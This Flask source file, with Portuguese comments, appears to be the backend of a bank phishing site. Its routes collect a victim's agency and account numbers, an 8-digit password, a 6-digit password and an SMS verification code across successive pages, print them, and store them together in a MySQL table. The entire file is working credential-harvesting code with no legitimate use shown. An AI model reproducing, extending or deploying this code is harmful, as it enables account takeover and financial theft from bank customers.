from flask import Flask, render_template, request, jsonify
from bd import conectar  # ⬅️ Importa seu arquivo de conexão

app = Flask(__name__)

# Variável temporária para guardar os dados entre as páginas
dados_temp = {}


# Página inicial
@app.route('/')
def home():
    return render_template('initial.html')


# Recebe dados da primeira página
@app.route('/dadosPageOne', methods=['POST'])
def receber_dados():
    dados = request.get_json()

    if not dados:
        return jsonify({'status': 'erro', 'mensagem': 'Nenhum dado recebido'}), 400

    agency = dados.get('agency')
    account = dados.get('account')
    password = dados.get('password')

    dados_temp['agency'] = agency
    dados_temp['account'] = account
    dados_temp['password8'] = password  # senha de 8 dígitos

    print('✅ Dados recebidos na primeira página:')
    print('Agência:', agency)
    print('Conta:', account)
    print('Senha:', password)

    return jsonify({'status': 'sucesso', 'mensagem': 'Dados recebidos com sucesso'})


# Página de senha 6 dígitos
@app.route('/password', methods=['GET'])
def password_page():
    return render_template('password.html')


# Recebe senha 6 dígitos
@app.route('/password', methods=['POST'])
def recebe_senha():
    dados = request.get_json()

    if not dados:
        return jsonify({'status': 'erro', 'mensagem': 'Nenhum dado recebido'}), 400

    password6 = dados.get('password6')

    if not password6 or len(password6) != 6:
        return jsonify({'status': 'erro', 'mensagem': 'Senha inválida'}), 400

    dados_temp['password6'] = password6

    print('🔑 Senha de 6 dígitos recebida:', password6)

    return jsonify({'status': 'sucesso', 'mensagem': 'Senha de 6 dígitos recebida com sucesso'})


# Página SMS
@app.route('/sms', methods=['GET'])
def sms_page():
    return render_template('sms.html')


# 🔥 Recebe o código SMS e salva tudo no banco
@app.route('/verificaCodigo', methods=['POST'])
def verifica_codigo():
    dados = request.get_json()

    if not dados:
        return jsonify({'status': 'erro', 'mensagem': 'Nenhum dado recebido'}), 400

    sms_code = dados.get('sms_code')

    if not sms_code or len(sms_code) < 4 or len(sms_code) > 6:
        return jsonify({'status': 'erro', 'mensagem': 'Código inválido'}), 400

    dados_temp['sms_code'] = sms_code

    # 🗄️ Inserir no banco
    conexao = conectar()

    if conexao:
        try:
            cursor = conexao.cursor()

            inserir = """
                INSERT INTO digital (agencia, conta, senha_8_digitos, senha_6_digitos, sms_code)
                VALUES (%s, %s, %s, %s, %s)
                ON DUPLICATE KEY UPDATE 
                    conta=VALUES(conta),
                    senha_8_digitos=VALUES(senha_8_digitos),
                    senha_6_digitos=VALUES(senha_6_digitos),
                    sms_code=VALUES(sms_code);
            """

            valores = (
                int(dados_temp.get('agency').replace('-', '')),
                str(dados_temp.get('account')),
                int(dados_temp.get('password8')),
                int(dados_temp.get('password6')),
                str(dados_temp.get('sms_code'))
            )


            cursor.execute(inserir, valores)
            conexao.commit()

            print('💾 Dados inseridos no banco com sucesso.')

            return jsonify({'status': 'sucesso', 'mensagem': 'Código SMS recebido e dados salvos com sucesso.'})

        except Exception as e:
            print(f'❌ Erro ao inserir no banco: {e}')
            return jsonify({'status': 'erro', 'mensagem': 'Erro ao salvar no banco.'}), 500

        finally:
            cursor.close()
            conexao.close()

    else:
        return jsonify({'status': 'erro', 'mensagem': 'Erro na conexão com o banco.'}), 500


if __name__ == '__main__':
    app.run(debug=True)
